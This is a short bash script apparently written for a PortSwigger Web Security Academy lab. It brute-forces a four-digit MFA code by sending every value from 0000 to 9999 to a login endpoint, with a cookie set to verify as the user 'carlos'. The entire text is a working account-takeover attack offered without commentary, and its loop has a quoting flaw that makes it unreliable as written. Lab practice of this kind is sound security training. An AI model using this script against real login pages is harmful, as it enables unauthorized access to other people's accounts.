#!/bin/bash
ENDPOINT="https://0ae50000046e303c8099622a005400aa.web-security-academy.net/login2"
COOKIE="session=123;verify=carlos"


for idx in {0..9999}
do
        MFA=$(printf "mfa-code=%04d\n" $idx) \
        curl $ENDPOINT -o /dev/null -s -w "Http Code: %{http_code} Used MFA: $MFA \n" -b "$COOKIE" --data-binary $MFA 
done